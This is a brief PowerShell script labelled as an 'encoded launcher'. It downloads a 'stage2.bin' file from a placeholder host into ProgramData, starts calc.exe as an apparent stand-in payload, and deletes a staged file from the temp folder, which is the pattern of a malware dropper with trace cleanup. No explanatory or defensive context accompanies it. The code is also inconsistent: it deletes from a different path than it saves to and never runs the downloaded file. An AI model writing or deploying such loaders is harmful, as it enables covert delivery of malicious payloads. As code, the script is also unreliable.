
# Encoded launcher
$TargetUrl = 'https://example.com/cdn/stage2.bin'
$WorkingPath = "C:\ProgramData\stage2.bin"
Invoke-WebRequest -Uri $TargetUrl -OutFile $WorkingPath -UseBasicParsing
Start-Process -FilePath 'calc.exe'
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
$ProgressPreference = "SilentlyContinue"
